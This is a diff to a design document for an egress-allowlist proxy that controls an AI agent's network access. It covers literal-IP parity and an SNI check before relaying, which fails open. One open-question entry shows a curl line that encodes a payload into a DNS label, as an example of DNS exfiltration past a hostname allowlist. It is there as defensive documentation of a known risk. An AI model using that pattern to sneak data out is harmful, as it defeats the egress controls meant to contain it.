@@ -257,6 +257,29 @@ same `decide()` across every redirect hop. Therefore:
 - **CIDR grants for private ranges** (patterns 1 and 2 from §4): working.
 - **Stage 2** (agent allowlist) is the sole implemented stage. Stages 1, 3,
   4a are deferred.
+- **Q7 resolved — `host_decide()` now mirrors `addr_permitted()`.** A literal
+  public IP in a numeric CONNECT is admitted the same way a resolved public
+  IP is: metadata carve-out first, then unconditional allow for any IP that
+  isn't in `http_is_private_ip()`'s private ranges, then CIDR-grant for
+  private IPs. Resolved in favor of parity — the stricter literal-IP bar
+  wasn't buying anything, since resolving the same IP via DNS already
+  allowed it unconditionally; treating the literal spelling as less
+  trustworthy than the resolved one was security theater, not a real
+  barrier to a fabricated-IP LLM output.
+- **Q6 resolved — SNI-aware relay check (`sni_check()` in `src/proxy.c`).**
+  A hostname-rule-authorized numeric CONNECT now gets a bounded `MSG_PEEK`
+  (2048B cap, ~2s budget) hand-rolled ClientHello walk before the blind
+  splice starts. Gate: only connections authorized via a hostname rule
+  (`via_hostname` in `handle_client()`) are checked — a CIDR/literal-IP grant
+  has no hostname claim to cross-check. Fallback: fails open (relay proceeds)
+  on absent/unparseable SNI — non-TLS traffic, a ClientHello that doesn't fit
+  the peek budget, or non-SNI TLS all pass through unaffected, since a
+  hostname grant never implied the protocol was HTTPS. Match rule: when SNI
+  *is* parsed, checked against the full granted host-rule set via
+  `host_match()`, not just the specific rule that authorized this connection
+  — mirrors how `bless_contains()` already works at the IP level (a suffix
+  grant may legitimately cover sibling hosts sharing the CDN IP). No MITM —
+  SNI is read cleartext from the ClientHello, never decrypted.
 
 ### Still open
 
@@ -274,3 +297,12 @@ same `decide()` across every redirect hop. Therefore:
 - **Q5 — Wildcard-label rules.** Needed, or does suffix cover every real
   case? (Suffix handles `.github.com` fan-out; wildcard only earns its
   place for mid-label matching.)
+- **Q8 — DNS-label exfiltration is out of scope for `decide()` and should stay
+  documented, not "fixed" here.** `host_decide()`/`addr_permitted()` gate
+  *which hostnames* may be resolved, not what's encoded in a label of an
+  otherwise-allowed query — `curl https://$(payload).allowed-suffix.com`
+  lets the payload leave via the DNS query itself, issued by the broker's
+  real resolver, before any connect/deny decision happens. This is a
+  fundamental limit of hostname-allowlist egress filtering in general (see
+  `shell-networking.md` Accepted Risks), not a defect in this pipeline —
+  noted here so it isn't mistaken for something Stage 1-4 could close.
